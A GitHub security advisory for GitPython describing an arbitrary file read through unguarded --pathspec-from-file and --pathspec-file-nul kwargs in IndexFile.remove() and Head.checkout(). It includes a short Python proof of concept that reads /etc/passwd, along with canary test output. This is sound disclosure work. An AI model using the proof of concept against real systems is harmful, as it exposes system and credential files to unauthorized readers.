# [M] GitPython: Arbitrary file read via --pathspec-from-file in IndexFile.remove() and Head.checkout()

## Summary
Severity: Medium
Advisory: GHSA-hh9p-6wh2-4mfc
CWE: CWE-200, CWE-73
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-07
Source: https://github.com/advisories/GHSA-hh9p-6wh2-4mfc
Type: github-advisory

## Affected
- PyPI: `GitPython` — affected >=0 <3.1.58

## Details
## Summary

`IndexFile.remove()` and `Head.checkout()` forward `**kwargs` into `git rm` and `git checkout`
with no guard. Passing `--pathspec-from-file=<file>` **together with `--pathspec-file-nul`**
makes Git treat the whole file as a single NUL-delimited pathspec, and the unmatched-pathspec
error quotes it verbatim. GitPython surfaces that through `GitCommandError.stderr`, so the
entire contents of a caller-chosen file are returned to the caller in band.

This is the same primitive as Instance 2 of
[GHSA-3f7w-8rr8-f37f](https://github.com/advisories/GHSA-3f7w-8rr8-f37f) - `TagReference.create()`
with `-F`, arbitrary file read returned in band - at two sites that advisory assessed and
cleared.

## Prior art, and why I am filing rather than commenting

GHSA-3f7w-8rr8-f37f's sweep table lists these four sites with the assessment
*"`--pathspec-from-file` only reads a pathspec; no write or disclosure primitive found"*:

| Call site | git command | that advisory's assessment |
|---|---|---|
| `IndexFile.remove()` | `rm` | `--pathspec-from-file` only reads a pathspec; no write or disclosure primitive found |
| `IndexFile.move()` | `mv` | same |
| `HEAD.reset()` | `reset` | same |
| `HEAD.checkout()` | `checkout` | same |

That assessment is very nearly right, and I think that is why it held: with
`--pathspec-from-file` alone, Git splits on newlines and the error quotes only the **first
line**, which reads as an uninteresting partial. Adding `--pathspec-file-nul` - a sibling flag
of the same option, and the documented way to handle paths containing newlines - makes the
whole file one pathspec.

## Root cause

`git/index/base.py:991-1043`:

```python
def remove(self, items, working_tree=False, **kwargs):
    ...
    removed_paths = self.repo.git.rm(args, paths, **kwargs).splitlines()   # line 1043
```

`git/refs/head.py:237-268`:

```python
def checkout(self, force: bool = False, **kwargs: Any):
    ...
    self.repo.git.checkout(self, **kwargs)                                 # line 268
```

Neither has an `allow_unsafe_options` parameter or a `check_unsafe_options()` call.

## Proof of concept

```python
from git import Repo
from git.exc import GitCommandError

repo = Repo("/path/to/repo")
kw = dict(pathspec_from_file="/etc/passwd", pathspec_file_nul=True)

try:
    repo.index.remove([], **kw)          # or: repo.heads[0].checkout(**kw)
except GitCommandError as e:
    print(e.stderr)                      # <- entire file contents
```

Observed on published 3.1.57, against a canary file holding three marked lines:

```
[PASS] IndexFile.remove() -> `git rm` returns ALL 3 canary lines in-band
       stderr: 'fatal: pathspec 'LINE1-CANARY-4242
       LINE2-SECRET-7777
       LINE3-TAIL-9999
       ' did not match any files'
[PASS] Head.checkout() -> `git checkout` returns ALL 3 canary lines in-band
       stderr: 'error: pathspec 'LINE1-CANARY-4242
       LINE2-SECRET-7777
       LINE3-TAIL-9999
       ' did not match any file(s) known to git'
[PASS] PRECISION: `git status` leaks 0/3 -- not every unguarded site discloses
[PASS] PRECISION: the GUARDED checkout-index leaks 0/3
```

The two precision controls are there so the result is about these sinks and not about the
canary being visible everywhere.

## Scope correction to the table above

Of the four sites cleared with that sentence, **two disclose and two do not**:

| Call site | disclosed? |
|---|---|
| `IndexFile.remove()` → `git rm` | **yes, full file** |
| `Head.checkout()` → `git checkout` | **yes, full file** |
| `HEAD.reset()` → `git reset` | no - `git reset` does not error on unmatched pathspecs |
| `IndexFile.move()` → `git mv` | no |

The two negatives are mentioned because "the dismissal was wrong" would overstate it: the
dismissal was wrong for half of what it covered.

## References
- https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-hh9p-6wh2-4mfc
- https://github.com/gitpython-developers/GitPython/pull/2204
- https://github.com/gitpython-developers/GitPython/commit/f2550b65bf60ca087190981e2c7b6865e201f40c
- https://github.com/gitpython-developers/GitPython
- https://github.com/gitpython-developers/GitPython/releases/tag/3.1.58
